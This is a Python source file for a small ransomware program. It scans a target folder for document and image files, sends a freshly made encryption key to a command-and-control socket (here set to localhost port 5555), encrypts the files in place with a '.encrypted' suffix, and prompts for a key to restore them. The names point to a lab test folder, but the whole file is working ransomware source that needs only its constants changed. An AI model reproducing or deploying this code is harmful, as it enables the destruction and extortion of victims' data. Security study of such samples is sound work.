import os
import socket
from cryptography.fernet import Fernet

C2_IP = "127.0.0.1"
C2_PORT = 5555
TARGET_FOLDER = "Ransomware_Test_Folder"

class RansomwareAES:
    def __init__(self, target_directory):
        self.target_dir = target_directory
        self.target_extensions = [".txt", ".csv", ".docx", ".png"]
        self.files_found = []
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def scan_files(self):
        print(f"[*] Scanning {self.target_dir}...")
        self.files_found = [] 
        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                if any(file.endswith(ext) for ext in self.target_extensions):
                    self.files_found.append(os.path.join(root, file))

    def send_key_to_c2(self):
        print(f"[*] Sending key to C2 ({C2_IP})...")
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((C2_IP, C2_PORT))
                s.send(self.key)
                if s.recv(1024).decode() == "ACK":
                    print("[V] Key sent & Backup confirmed!")
                    return True
        except Exception as e:
            print(f"[X] C2 Connection Failed: {e}")
            return False

    def encrypt_files(self):
        print("[*] Encrypting files...")
        for file_path in self.files_found:
            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                encrypted_data = self.crypter.encrypt(data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                os.rename(file_path, file_path + ".encrypted")
                print(f"[V] Encrypted: {file_path}")
            except Exception as e:
                print(f"[X] Error: {e}")

    def decrypt_files(self, key):
        print("[*] Decrypting files...")
        decrypter = Fernet(key)
        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                if file.endswith(".encrypted"):
                    full_path = os.path.join(root, file)
                    try:
                        with open(full_path, "rb") as f:
                            data = f.read()
                        decrypted_data = decrypter.decrypt(data)
                        original_name = full_path.replace(".encrypted", "")
                        with open(original_name, "wb") as f:
                            f.write(decrypted_data)
                        os.remove(full_path)
                        print(f"[V] Restored: {original_name}")
                    except:
                        print(f"[X] Failed to decrypt {file}")

if __name__ == "__main__":
    malware = RansomwareAES(TARGET_FOLDER)
    malware.scan_files()
    
    if malware.send_key_to_c2():
        malware.encrypt_files()
        print("\n[!!!] FILES ENCRYPTED [!!!]")
        
        user_key = input("Enter decryption key from server to restore: ")
        malware.decrypt_files(user_key.encode())
    else:
        print("[!] Encryption aborted - No C2 connection.")
